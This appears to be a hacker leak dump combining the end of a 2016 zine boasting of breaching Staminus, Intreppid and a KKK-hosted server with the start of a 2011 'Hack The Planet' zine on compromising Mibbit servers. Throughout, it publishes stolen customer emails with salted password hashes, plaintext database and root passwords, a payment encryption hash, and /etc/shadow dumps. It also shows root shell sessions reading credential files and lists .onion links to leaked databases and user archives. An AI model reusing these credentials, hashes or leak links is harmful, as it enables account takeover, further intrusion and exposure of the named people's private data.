    | accountsbrs@quantumit.com.au          | Bankroll Studios                                        | 74aec77c514794506683d7b6fb2d3cc9:fOH)I |
    | zenoscape@hotmail.com                 | ZenoScape                                               | 4e59e2475b516366259b0e27ef4ad4ff:yZ!sm |
    | arrondawson55@gmail.com               | EmulousHCF                                              | beef13cce41aae05455e3c8de37aa868:F)N#! |
    | shadikurbd@gmail.com                  | Jafko Telecom                                           | 64df286033bbc3df9cac5408b2e6cb42:(ZgT# |
    | azanku19@gmail.com                    | Draconia                                                | 2fdb713e53dc1e4f0348863949659912:HWAQc |
    | 71Kevin17@gmail.com                   |                                                         | df37ffb83cfac004188f292394901631:(ZKx% |
    | daniel4d@gmail.com                    |                                                         | c24b22fd3fa75130ea4b5053a7703361:xsNT! |
    | hamilton.w@live.com                   | Levelhosting Inc.                                       | 1d20b5cc642e94b65d8204a66d8f9797:bvY%t |
    | gffwffiffzffg@gmail.com               |                                                         | f69d00950bdac61043d0b49f8ea6c3c5:shILb |
    | perin_2020@hotmail.com                | peri                                                    | e2d121ea25974f3fef07b488da7a0f47:KmhNC |
    | servers@low-key.us                    | Low-Key Gaming                                          | 4b2f6c240c1043ffa1287c4130d2929f:)qbvT |
    | Mrdeweytv@gmail.com                   |                                                         | 6d9159285d713646e20c41a80d48363c:j(!)Q |
    | services@expressvpn.com               | ExpressVPN                                              | 23c6e3a0142b1aae97aecfec297ce041:N)Ljt |
    | zoom3rlol@gmail.com                   | cs                                                      | 27b79a4077dd6056f5c293f818e7b26d:BzVUz |
    | michaelmcevoy33@gmail.com             | Masonicz                                                | cb79f1a4e1cee7c3ece41eca96cc7b7c:aw!nH |
    | me@togglinq.io                        | None                                                    | f8193e381e1034998cc0faa41649a4af:R%qVk |
    | thekingkillershow@yahoo.com           |                                                         | 53aabbcd626cdde47afa34f0889eee05:PBw#n |
    | sozdar_2001@yahoo.com                 |                                                         | fd492ff587ba19eb32df9c0987adf575:IcnhM |
    | SlimTheReaper@gmail.com               | N/A                                                     | 87db05e67f8656005c3c6000629e3639:PWiWl |
    | calist3@care2.com                     | GooseGames LLC                                          | 08ff123ed00d1e248bc2e57847ba6ae5:NGOsp |
    | corporate@digitalleisure.com          | Digital Leisure Inc.                                    | 63ef3d0c887fcaf4cf5d2362faa880b2:NOa#T |
    | mcwarside@hotmail.com                 | MCWarside                                               | edd197233e25ebb176ecda83aac51801:GQ#M( |
    | sean@rapideagle.com                   | VoIP Essential Inc.                                     | cc5bb09bb79934fd5bd95b74ecb136d9:))MTW |
    | mailer.caster@gmail.com               | Caster.fm                                               | f800a5155e6ca08b1fcb1732a3ae924e:b#%Gp |
    +---------------------------------------+---------------------------------------------------------+----------------------------------------+
  cat www/html/wp-config.php
    ::    SNIP ::
     /** MySQL database username */
    define('DB_USER', 'Intrepid');

    /** MySQL database password */
    define('DB_PASSWORD', '23R0c001!');

    /** MySQL hostname */
    define('DB_HOST', 'localhost');
    ::    SNIP ::
  cat www/html/whmcs/configuration.php
    ::    SNIP ::
    $license = 'Leased-4ffa9003ed22baf252dd';
    $db_host = 'localhost';
    $db_username = 'whmcs';
    $db_password = '23R0c001!';
    $db_name = 'whmcs';
    $cc_encryption_hash = 'juTOtwLMViqpbQHxihu4vm00scaIg9spuc3NzFqkOHAPn8cwfxqBJgr2jsApsTFM';
    $templates_compiledir = 'templates_c/';
    $mysql_charset = 'utf8';
    date_default_timezone_set('America/Los_Angeles');
    ::    SNIP ::


██╗  ██╗██╗  ██╗██╗  ██╗       ██╗       ███████╗██████╗ ██╗███████╗███╗   ██╗██████╗ ███████╗
██║ ██╔╝██║ ██╔╝██║ ██╔╝       ██║       ██╔════╝██╔══██╗██║██╔════╝████╗  ██║██╔══██╗██╔════╝
█████╔╝ █████╔╝ █████╔╝     ████████╗    █████╗  ██████╔╝██║█████╗  ██╔██╗ ██║██║  ██║███████╗
██╔═██╗ ██╔═██╗ ██╔═██╗     ██╔═██╔═╝    ██╔══╝  ██╔══██╗██║██╔══╝  ██║╚██╗██║██║  ██║╚════██║
██║  ██╗██║  ██╗██║  ██╗    ██████║      ██║     ██║  ██║██║███████╗██║ ╚████║██████╔╝███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝      ╚═╝     ╚���╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝

  ~[CTRL-H]~ KKK & FRIENDS
         This was a real treat and one that completely blindsided our team. After pillaging and generally shitting on
         the entirety of Staminus' & co's infrastructure, it was discovered that one of the client box's was housing a real gem.
         Yes, that's right, Staminus was hosting the KKK and it's affiliates. An organization legally recognized in some regions
         as a terrorist collective. Not that we hold anything against the KKK. Choosing such an awful host as Staminus however is
         unforgiveable, and consequently they had to be punished.
             
    :: SNIP ::
        Hello Rachel Pendergraft,

        Your server is complete.

        Here is your server information:

        Administrative IP: 69.197.2.214 (Private Use)
        Protected IP: 69.197.31.193 (Public Use)
        User: root
        Password: TkBNk7TdrSh2Uq42
        Secondary Usable IP&#039;s: 69.197.31.193 - 69.197.31.206

        Please remember to not give out your Administrative IP [69.197.2.214]. Only use your Protected IP [69.197.31.193] for public serving services.

        Your protected IP is protected for 30 Gbps or 12 Million Packet Per Second which ever it reaches first. If your attack goes above either one 
        of those your protected IP will be nullrouted for the duration of the attack. If you wish to upgrade at that time 
        please submit a sales ticket requesting a quote.

        Your can reach your cPanel at https://69.197.2.214:2087

        If you have any further questions please do not hesitate to ask us.

        Thank you


        ---
        Thank You
        Intreppid Support |
    :: SNIP ::
    
    ( ?° ?? ?°)
    
    :: SNIP ::
        Please set the following rDNS pointers:

        69.197.2.214         sv1.harrisonarkansaswebsites.com
        69.197.31.193       kkk.bz
        69.197.31.198       wpmedianetwork.com
        69.197.31.199       kkk.com
        69.197.31.200       kkkradio.com
        69.197.31.201       americanheritagecommittee.com
        69.197.31.205       sotctraininginstitute.com
        69.197.31.206       sotctv.com


        Thank you

        ----------------------------
        IP Address: 72.204.92.252 |
    :: SNIP ::

  root@sv1 [~]# cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:99:99:Nobody:/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
    rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
    abrt:x:173:173::/etc/abrt:/sbin/nologin
    rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
    haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
    ntp:x:38:38::/etc/ntp:/sbin/nologin
    saslauth:x:499:76:""Saslauthd user"":/var/empty/saslauth:/sbin/nologin
    postfix:x:89:89::/var/spool/postfix:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    tcpdump:x:72:72::/:/sbin/nologin
    oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
    nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
    named:x:25:25:Named:/var/named:/sbin/nologin
    mailnull:x:47:47:Exim:/var/spool/mqueue:/bin/false
    mysql:x:498:497:MySQL server:/var/lib/mysql:/bin/bash
    dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
    dovenull:x:497:496:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
    cpanel:x:201:201::/var/cpanel/userhomes/cpanel:/usr/local/cpanel/bin/noshell
    cpanelphpmyadmin:x:202:202::/var/cpanel/userhomes/cpanelphpmyadmin:/usr/local/cpanel/bin/noshell
    cpanelphppgadmin:x:203:203::/var/cpanel/userhomes/cpanelphppgadmin:/usr/local/cpanel/bin/noshell
    cpanelroundcube:x:204:204::/var/cpanel/userhomes/cpanelroundcube:/usr/local/cpanel/bin/noshell
    cpanelrrdtool:x:205:205::/var/cpanel/userhomes/cpanelrrdtool:/usr/local/cpanel/bin/noshell
    mailman:x:206:206::/usr/local/cpanel/3rdparty/mailman/mailman:/usr/local/cpanel/bin/noshell
    cpanellogin:x:496:494::/var/cpanel/userhomes/cpanellogin:/usr/local/cpanel/bin/noshell
    cpaneleximfilter:x:495:493::/var/cpanel/userhomes/cpaneleximfilter:/usr/local/cpanel/bin/noshell
    cpaneleximscanner:x:494:492::/var/cpanel/userhomes/cpaneleximscanner:/usr/local/cpanel/bin/noshell
    cpanelconnecttrack:x:493:491::/var/cpanel/userhomes/cpanelconnecttrack:/usr/local/cpanel/bin/noshell
    cpses:x:492:490::/var/cpanel/cpses:/sbin/nologin
    kkkcom:x:500:500::/home/kkkcom:/usr/local/cpanel/bin/noshell
    sotctrai:x:501:501::/home/sotctrai:/usr/local/cpanel/bin/jailshell
    sotctvc:x:502:502::/home/sotctvc:/usr/local/cpanel/bin/jailshell
    kkkpen6:x:504:504::/home/kkkpen6:/usr/local/cpanel/bin/jailshell
    american:x:505:505::/home/american:/bin/bash
    kkkradio:x:506:506::/home/kkkradio:/usr/local/cpanel/bin/noshell
    wpmedia:x:507:507::/home/wpmedia:/usr/local/cpanel/bin/noshell
    harrisonarkansas:x:508:508::/home/harrisonarkansas:/bin/bash
    clamav:x:509:509::/home/clamav:/sbin/nologin
    whiteradio:x:510:510::/home/whiteradio:/usr/local/cpanel/bin/jailshell
  root@sv1 [~]# cat /etc/shadow
    root:$6$4izKD95ssUtDEKEY$OlfGvM/Vam5HdbtT9R.bxRvUBe7S9oRGR9hCHkiUaF.j2gdJ3lh2O/9qIV0q9oUHqYo.E/wmXU2SfKw2.nYoa1:16827:0:99999:7:::
    bin:*:15628:0:99999:7:::
    daemon:*:15628:0:99999:7:::
    adm:*:15628:0:99999:7:::
    lp:*:15628:0:99999:7:::
    sync:*:15628:0:99999:7:::
    shutdown:*:15628:0:99999:7:::
    halt:*:15628:0:99999:7:::
    mail:*:15628:0:99999:7:::
    uucp:*:15628:0:99999:7:::
    operator:*:15628:0:99999:7:::
    games:*:15628:0:99999:7:::
    gopher:*:15628:0:99999:7:::
    ftp:*:15628:0:99999:7:::
    nobody:*:15628:0:99999:7:::
    dbus:!!:16763::::::
    vcsa:!!:16763::::::
    rpc:!!:16763:0:99999:7:::
    abrt:!!:16763::::::
    rpcuser:!!:16763::::::
    nfsnobody:!!:16763::::::
    haldaemon:!!:16763::::::
    ntp:!!:16763::::::
    saslauth:!!:16763::::::
    postfix:!!:16763::::::
    sshd:!!:16763::::::
    tcpdump:!!:16763::::::
    oprofile:!!:16763::::::
    nscd:!!:16763::::::
    named:!!:16763::::::
    mailnull:!!:16763::::::
    mysql:!!:16763::::::
    dovecot:!!:16763::::::
    dovenull:!!:16763::::::
    cpanel:*:16763::::::
    cpanelphpmyadmin:*:16763::::::
    cpanelphppgadmin:*:16763::::::
    cpanelroundcube:*:16763::::::
    cpanelrrdtool:*:16763::::::
    mailman:*:16763::::::
    cpanellogin:!!:16763::::::
    cpaneleximfilter:!!:16763::::::
    cpaneleximscanner:!!:16763::::::
    cpanelconnecttrack:!!:16763::::::
    cpses:!!:16763::::::
    kkkcom:$6$h.XE7tATzeTEXTc2$0bgqXG1ZfqXp6bUnZSQO6dw57DpbrXZi7.AqjXyJFeg4QZ1gQ4JlxROLVCGwq7tMg6QsTBt075C.4PhYUgHDi/:16763:0:99999:7:::
    sotctrai:$1$UDsXv17a$vlI/hMvWvrd7loTGydbYm1:16763:0:99999:7:::
    sotctvc:$6$.qQotTxu6nz8aGbW$bEwWcWyhyIsa8DqV8Q8E/sclXvZuyfcx4p1uvBGiDcl.os62z/B3/GKGurlKtJfOvwCMzucrSFC/Bo7kjHp3Y1:16763:0:99999:7:::
    kkkpen6:$1$USWrdUqZ$eBdcbfgLQy9o0s.EKxDER.:16763:0:99999:7:::
    american:$1$T91QSPab$CPlzITFSlr0VjTO9jsGln1:16764:0:99999:7:::
    kkkradio:$6$EWmjNAwjV0OTxLzQ$JwPMYH8JPJhoZZZbfmVxCBM4EEJ7r7uIJrArvVR6Rx5lvx.SmAdYMy82G4DGUJCDbwIqxoXs7e48qS8n9X5D10:16764:0:99999:7:::
    wpmedia:$1$fyze3CAj$2KjG60YDb2qf6feDdHMYN1:16764:0:99999:7:::
    harrisonarkansas:$6$DUoFnQgxKEjN/2w6$.k/el.mCl6FPaf4ics4lB4.cOqcgEXHhWsjf4spSS4w1K2XkbFJqLUPYuwlQ73yJHGovv6vIJJVSX5.hP6S7r1:16788:0:99999:7:::
    clamav:!!:16830:0:99999:7:::
    whiteradio:$6$UlVWUbs.bJwQ3fV6$h/8Sq7426Kn9trOXAPCmn/Jj9hdfArXBdLRVoCK2YH7gB4BbLaPRoWc.5.ZV08SpGVhbmYTb2H2rI2CS/fNAO0:16851:0:99999:7:::
  root@sv1 [~]# ls -la
    total 312
    dr-xr-x---. 19 root root  4096 Feb 25 01:35 ./
    drwxr-xr-x. 25 root root  4096 Feb  8 10:40 ../
    -rw-------.  1 root root   990 Feb 19 20:43 .accesshash
    -rw-------.  1 root root  1679 Nov 23 23:10 anaconda-ks.cfg
    -rw-------.  1 root root 15098 Feb 24 20:14 .bash_history
    -rw-------.  1 root root  3015 Jan 27 14:01 .bash_history.cpanel_ticket.7446277
    -rw-r--r--.  1 root root    18 May 20  2009 .bash_logout
    -rw-r--r--.  1 root root   176 May 20  2009 .bash_profile
    -rw-r--r--.  1 root root   176 Sep 22  2004 .bashrc
    -rw-------.  1 root root 45056 Jan 27 03:14 .bwusage.sqlite
    drwx------.  5 root root  4096 Jan 30 11:00 .cpanel/
    drwxr-xr-x.  4 root root  4096 Nov 24 13:54 cpanel3-skel/
    drwxr-xr-x.  3 root root  4096 Nov 24 02:34 .cpanm/
    drwx------.  4 root root  4096 Nov 24 02:47 .cpobjcache/
    -rw-r--r--.  1 root root   100 Sep 22  2004 .cshrc
    drwxr-xr-x.  2 root root  4096 Feb 24 14:59 .data/
    -rw-------.  1 root root    24 Nov 24 13:48 .forward
    drwx------.  2 root root  4096 Nov 24 02:35 .gnupg/
    drwx------.  2 root root  4096 Jan 27 14:30 .HttpRequest/
    -rw-r--r--.  1 root root    10 Nov 24 02:31 installer.lock
    -rw-r--r--.  1 root root 26505 Nov 23 23:10 install.log
    -rw-r--r--.  1 root root  7572 Nov 23 23:08 install.log.syslog
    drwx------.  2 root root  4096 Nov 25 06:51 .libnet-openssh-perl/
    drwx------.  6 root root  4096 Jan 27 14:30 .MirrorSearch/
    -rw-------.  1 root root    48 Nov 24 02:33 .my.cnf
    drwxr-xr-x.  4 root root  4096 Dec  2 04:23 perl5/
    -rw-r--r--.  1 root root 38475 Nov 24 18:58 php.ini.new
    -rw-r--r--.  1 root root 38475 Nov 24 18:58 php.ini.orig
    drwxr-----.  3 root root  4096 Jan 27 13:15 .pki/
    drwxr-xr-x.  2 root root  4096 Nov 24 03:42 public_ftp/
    drwxr-xr-x.  3 root root  4096 Nov 24 03:42 public_html/
    drwxr-xr-x.  2 root root  4096 Feb 23 02:20 .razor/
    -rw-------.  1 root root  1024 Feb  8 08:45 .rnd
    drwx------.  3 root root  4096 Nov 24 02:25 .spamassassin/
    drwx------.  2 root root  4096 Feb 24 15:14 .ssh/
    -rw-r--r--.  1 root root   129 Dec  3  2004 .tcshrc
    drwxr-xr-x.  3 root root  4096 Feb 23 02:19 tmp/
    -rw-------.  1 root root  2030 Nov 24 02:04 .viminfo
  root@sv1 [~]# ls -la /home/
    total 132
    drwx--x--x. 20 root             root              4096 Feb 24 15:01 ./
    drwxr-xr-x. 25 root             root              4096 Feb  8 10:40 ../
    -rw-r--r--.  1 root             root               529 Nov 24 02:48 0_README_BEFORE_DELETING_VIRTFS
    drwx--x--x. 21 american         american          4096 Jan 27 04:32 american/
    drwx--x--x.  2 clamav           clamav            4096 Jan 30 11:02 clamav/
    drwxr-xr-x.  5 root             root              4096 Nov 24 14:38 .cpan/
    drwxr-xr-x.  2 root             root              4096 Nov 24 02:55 cPanelInstall/
    drwxr-xr-x.  3 root             root              4096 Nov 24 18:55 .cpanm/
    drwx------.  3 root             root              4096 Feb 23 02:20 .cpcpan/
    drwx------.  3 root             root              4096 Nov 24 02:36 cpeasyapache/
    drwxr-xr-x.  2 root             root              4096 Feb 24 17:23 .data/
    drwx--x--x. 11 harrisonarkansas harrisonarkansas  4096 Dec 18 21:11 harrisonarkansas/
    drwx--x--x. 14 kkkcom           kkkcom            4096 Jan 27 04:32 kkkcom/
    drwx--x--x. 19 kkkpen6          kkkpen6           4096 Jan 27 04:32 kkkpen6/
    drwx--x--x. 17 kkkradio         kkkradio          4096 Nov 25 14:14 kkkradio/
    -rw-r--r--.  1 root             root             25138 Nov  4 13:24 latest
    drwx------.  2 root             root             16384 Nov 23 22:58 lost+found/
    -rw-------.  1 root             root              7168 Feb 25 01:34 quota.user
    drwx--x--x. 17 sotctrai         sotctrai          4096 Jan 27 04:32 sotctrai/
    drwx--x--x. 16 sotctvc          sotctvc           4096 Jan 27 04:32 sotctvc/
    drwx--x--x.  3 root             root              4096 Nov 24 02:48 virtfs/
    drwx--x--x. 12 whiteradio       whiteradio        4096 Feb 19 20:44 whiteradio/
    drwx--x--x. 25 wpmedia          wpmedia           4096 Jan 27 04:32 wpmedia/
  root@sv1 [~/.razor]# cd /home/kkkcom
  root@sv1 [/home/kkkcom]# ls -la
    total 80
    drwx--x--x. 14 kkkcom kkkcom 4096 Jan 27 04:32 ./
    drwx--x--x. 20 root   root   4096 Feb 24 15:01 ../
    lrwxrwxrwx.  1 kkkcom kkkcom   32 Nov 27  2014 access-logs -> /usr/local/apache/domlogs/kkkcom/
    -rw-r--r--.  1 kkkcom kkkcom   18 Oct 16  2014 .bash_logout
    -rw-r--r--.  1 kkkcom kkkcom  176 Oct 16  2014 .bash_profile
    -rw-r--r--.  1 kkkcom kkkcom  124 Oct 16  2014 .bashrc
    drwxr-xr-x.  2 kkkcom kkkcom 4096 Oct 19 03:08 cache/
    -rw-------.  1 kkkcom kkkcom   28 Jan  1  2015 .contactemail
    drwxr-xr-x.  2 kkkcom kkkcom 4096 Feb 23 02:20 .cpanel/
    -rw-r-----.  1 kkkcom kkkcom    1 Apr 25  2015 cpbackup-exclude.conf
    drwx------.  4 kkkcom kkkcom 4096 Nov 24 14:12 .cphorde/
    drwxr-x---.  2 kkkcom mail   4096 Nov 27  2014 etc/
    drwxr-x---.  2 kkkcom nobody 4096 Nov 27  2014 .htpasswds/
    drwx------.  2 kkkcom kkkcom 4096 Feb 14 06:18 logs/
    drwxr-x--x.  8 kkkcom kkkcom 4096 Nov 27  2014 mail/
    drwxr-x---.  3 kkkcom kkkcom 4096 Nov 27  2014 public_ftp/
    drwxr-x---.  4 kkkcom nobody 4096 Nov 28  2014 public_html/
    drwxr-xr-x.  5 kkkcom kkkcom 4096 Oct 20 03:01 ssl/
    drwxr-xr-x.  7 kkkcom kkkcom 4096 Nov 27  2014 tmp/
    drwxr-xr-x.  3 kkkcom kkkcom 4096 Jan 27 04:32 var/
    lrwxrwxrwx.  1 kkkcom kkkcom   11 Nov 27  2014 www -> public_html/
    -rw-r--r--.  1 kkkcom kkkcom  658 Nov 10 06:27 .zshrc

    
  ~[CTRL-Z]~ EOF & Mirrors
  
    Staminus
    
        FILES:
            http://emqyrhqhxwbetyjb.onion/chatbot.tar.gz
            http://emqyrhqhxwbetyjb.onion/lighttpd.tar.gz
            http://emqyrhqhxwbetyjb.onion/main.tar.gz
            http://emqyrhqhxwbetyjb.onion/openvpn.tar.gz
            http://emqyrhqhxwbetyjb.onion/svn.tar.gz
            
        SQL:
            http://emqyrhqhxwbetyjb.onion/3-9-staminus2.sql
            http://emqyrhqhxwbetyjb.onion/accountUpdate.sql
            http://emqyrhqhxwbetyjb.onion/acctserver.sql
            http://emqyrhqhxwbetyjb.onion/appliance_lan.sql
            http://emqyrhqhxwbetyjb.onion/full.sql
            http://emqyrhqhxwbetyjb.onion/ip_limit_history.sql
            http://emqyrhqhxwbetyjb.onion/ip_limit_profile.sql
            http://emqyrhqhxwbetyjb.onion/ip_limit.sql
            http://emqyrhqhxwbetyjb.onion/sp.sql
    
    Intreppid
    
        FILES:
            http://emqyrhqhxwbetyjb.onion/www2.tar.gz
        SQL:
            http://emqyrhqhxwbetyjb.onion/fucked.dump
    
    KKK + Friends
    
        FILES:
            http://emqyrhqhxwbetyjb.onion/american.tar.gz
            http://emqyrhqhxwbetyjb.onion/harrisonarkansas.tar.gz
            http://emqyrhqhxwbetyjb.onion/kkkcom.tar.gz
            http://emqyrhqhxwbetyjb.onion/kkkpen6.tar.gz
            http://emqyrhqhxwbetyjb.onion/kkkradio.tar.gz
                                                    ____
                                         v        _(    )
        _ ^ _                          v         (___(__)
       '_\V/ `
       ' oX`
          X                            v
          X             ~EOF~
          X                                                 .
          X        \O/          -UNTIL NEXT TIME-           |\
          X.a##a.   M                                       |_\
       .aa########a.>>                                    __|__
    .a################aa.                                 \FTA/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                        FUCK THEM ALL - 2016"
Papers,Hack The Planet (HTP) Zine 2,eZine,,2011-08-11,: N/A,"HACK THE PLANET


:: Table of Contents ::
 0x01 ~ Preface
 0x02 ~ tools.mibbit.com
  - 0x03 ~ PM logs
 0x04 ~ status.mibbit.com
 0x05 ~ sidewinder.netonecom.net
 0x06 ~ d0x
 0x07 ~ exit


:: 0x01 - Preface :: 

You may have read the about the various attention-whoring skid injections of LulzSec in the news lately, who hasn't? 
Apparently, anyone can pick up Havij, LFImap, or LOIC and make media headlines today. It seems they have succeeded in 
defacing the name of the anti-sec movement, turning it into a faux-revolutionary battle cry in the form of #antisec. 
However, anti-sec is not what it is being portrayed as. In actuality, anti-sec is the practice of keeping one's 
exploits and hacks to oneself for the good of everyone else (or personal profit, depending on who you ask). LulzSec, I 
would throw in a note here, but it seems I'm too late, most of you are already raided. To the rest, make your time.

Not on the front page of the latest hacking busts and takedowns, the more skilled among us know not to broadcast our 
various 0wnages. We silently slip in and sift through large networks. Releases are private. Obviously, when you have a 
group that comes along such as Lulzsec, the question is not what they will get into, but how long they will last.

More importantly, I would like to establish that the former Scene has very nearly disappeared since the rise of groups 
like Lulzsec. Blindly exploiting and staging large scale unjustified attacks against arbitrary organizations is not the 
mentality of hacking. Hacking is about curiousity. Hacking is about information. Attacking government entities so you 
can give the media your devoid justice statement is not hacking. It's called bullshit. I've seen enough garbage from 
Lulzsec releases.

Today, we would like to provide the community with a special release, exclusively for all of the skidiots on Mibbit 
fueling Lulzsec/#antisec efforts. Enjoy.

- HTP


targ3t:

-                           Mibbit

0wn3d:

 -               Axod       Azander    Havvy
 -               Hercule    Joshua     Kitsune
 -               Molkmin    Pottsi     Sindacious


:: 0x02 - 0wnage - tools.mibbit.com ::
[h () ck ~]$ ssh root () tools mibbit com
root () tools mibbit com's password: 
Last login: Fri Aug 12 23:16:22 2011 from [redacted]
root () tools:~# uname -a
Linux tools.mibbit.com 2.6.32.16-linode28 #1 SMP Sun Jul 25 21:32:42 UTC 2010 i686 GNU/Linux
root () tools:~# cat /etc/passwd /etc/shadow
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
ntp:x:102:104::/home/ntp:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
wwwadmin:x:1000:1000::/home/wwwadmin:/bin/bash
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
Debian-exim:x:105:107::/var/spool/exim4:/bin/false
root:$1$6793e8d9$aGW9MH6RaZmSP4Tncpwrb1:14728:0:99999:7:::
daemon:*:14728:0:99999:7:::
bin:*:14728:0:99999:7:::
sys:*:14728:0:99999:7:::
sync:*:14728:0:99999:7:::
games:*:14728:0:99999:7:::
man:*:14728:0:99999:7:::
lp:*:14728:0:99999:7:::
mail:*:14728:0:99999:7:::
news:*:14728:0:99999:7:::
uucp:*:14728:0:99999:7:::
proxy:*:14728:0:99999:7:::
www-data:*:14728:0:99999:7:::
backup:*:14728:0:99999:7:::
list:*:14728:0:99999:7:::
irc:*:14728:0:99999:7:::
gnats:*:14728:0:99999:7:::
nobody:*:14728:0:99999:7:::
libuuid:!:14728:0:99999:7:::
syslog:*:14728:0:99999:7:::
ntp:*:14728:0:99999:7:::
sshd:*:14728:0:99999:7:::
wwwadmin:$6$.EejimbY$xKAXfpd3nBlNeoQ6pBWBqh673jW2ytSmL5WoUkXaRxadV/fUIM2nQcxm1mGzk1YI9t3yQH8XMzpzSHpNv1jb00:15048:0:99999:7:::
mysql:!:15048:0:99999:7:::
Debian-exim:!:15075:0:99999:7:::
root () tools:~# ps aux | grep log
root       201  0.0  0.0      0     0 ?        S    Mar15   0:00 [xfslogd/0]
root       202  0.0  0.0      0     0 ?        S    Mar15   0:00 [xfslogd/1]
root       203  0.0  0.0      0     0 ?        S    Mar15   0:00 [xfslogd/2]
root       204  0.0  0.0      0     0 ?        S    Mar15   0:00 [xfslogd/3]
syslog    9019  0.0  0.2  21200  1288 ?        Sl   Mar15   1:35 rsyslogd -c4
wwwadmin 18565  0.0  0.6   5056  3360 ?        S    Mar31  22:01 /home/wwwadmin/loggerbot/eggdrop ./logger1
root () tools:~# ls -al /
total 96
drwxr-xr-x  22 root root  4096 Mar 15 22:22 .
drwxr-xr-x  22 root root  4096 Mar 15 22:22 ..
drwxrwxrwx  20 root root  4096 Aug  6 23:14 OLD_DATA
drwxr-xr-x   2 root root  4096 Mar 15 12:19 bin
drwxr-xr-x   2 root root  4096 Apr 29  2010 boot
drwxr-xr-x  11 root root 13640 Mar 15 12:20 dev
drwxr-xr-x  76 root root  4096 Aug 13 01:26 etc
drwxr-xr-x   3 root root  4096 Mar 15 12:31 home
drwxr-xr-x  17 root root 12288 Aug  9 00:38 lib
drwx------   2 root root 16384 Apr 29  2010 lost+found
drwxr-xr-x   2 root root  4096 Apr 29  2010 media
drwxr-xr-x   2 root root  4096 Apr 23  2010 mnt
drwxr-xr-x   2 root root  4096 Apr 29  2010 opt
dr-xr-xr-x 117 root root     0 Mar 15 12:04 proc
drwx------   4 root root  4096 Aug 13 02:32 root
drwxr-xr-x   2 root root  4096 Mar 15 12:20 sbin
drwxr-xr-x   2 root root  4096 Dec  5  2009 selinux
drwxr-xr-x   2 root root  4096 Apr 29  2010 srv
drwxr-xr-x  12 root root     0 Mar 15 12:04 sys
drwxrwxrwt   4 root root  4096 Aug 12 08:40 tmp
drwxr-xr-x  11 root root  4096 Aug  9 00:44 usr
drwxr-xr-x  15 root root  4096 Aug  9 00:44 var
root () tools:~# ls -al /home
total 12
drwxr-xr-x  3 root     root     4096 Mar 15 12:31 .
drwxr-xr-x 22 root     root     4096 Mar 15 22:22 ..
drwxr-xr-x  7 wwwadmin wwwadmin 4096 Aug 12 16:13 wwwadmin
root () tools:~# ls -al /home/wwwadmin
total 1076
drwxr-xr-x  7 wwwadmin wwwadmin   4096 Aug 12 16:13 .
drwxr-xr-x  3 root     root       4096 Mar 15 12:31 ..
-rw-r--r--  1 wwwadmin wwwadmin   5014 Aug  7 20:51 .bash_history
-rw-r--r--  1 wwwadmin wwwadmin    220 Apr 19  2010 .bash_logout
-rw-r--r--  1 wwwadmin wwwadmin   3136 Aug  7 17:39 .bashrc
drwx------  2 wwwadmin wwwadmin   4096 Mar 15 20:10 .cache
-rw-r--r--  1 wwwadmin wwwadmin     19 Jan 29  2009 .hercpw
-rw-r--r--  1 wwwadmin wwwadmin    148 Apr 11  2010 .htpasswd
-rw-------  1 wwwadmin wwwadmin    177 Aug  6 15:34 .lesshst
-rw-------  1 wwwadmin wwwadmin    214 Mar 16 20:20 .mysql_history
-rw-------  1 wwwadmin wwwadmin     55 Mar 16 18:19 .php_history
-rw-r--r--  1 wwwadmin wwwadmin    700 Mar 15 20:55 .profile
-rw-r--r--  1 wwwadmin wwwadmin     66 Mar 31 16:37 .selected_editor
